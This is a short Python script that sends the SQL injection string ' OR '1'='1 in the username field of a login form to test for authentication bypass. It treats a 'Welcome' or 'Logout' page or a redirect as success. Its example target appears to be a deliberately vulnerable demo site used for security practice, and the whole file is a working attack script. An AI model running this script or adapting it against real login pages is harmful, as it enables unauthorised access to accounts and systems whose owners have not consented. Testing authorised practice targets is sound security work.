import requests

def sqli_login_scanner(url):
    # SQLi payload to bypass login
    payload = "' OR '1'='1"
    
    # Form body with payload in the username
    data = {
        "uid": payload,
        "passw": "anything",
        "btnSubmit": "Login"
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }

    print(f"[+] Testing {url} for login bypass using SQL injection...")

    response = requests.post(url, data=data, headers=headers)

    # Check if login succeeded by looking for common success indicators
    if "Welcome" in response.text or "Logout" in response.text or response.status_code == 302:
        print("[!] Login SQL Injection vulnerability detected!")
    else:
        print("[-] No login SQL Injection vulnerability detected.")

# Example usage
url = "https://demo.testfire.net/doLogin"
sqli_login_scanner(url)
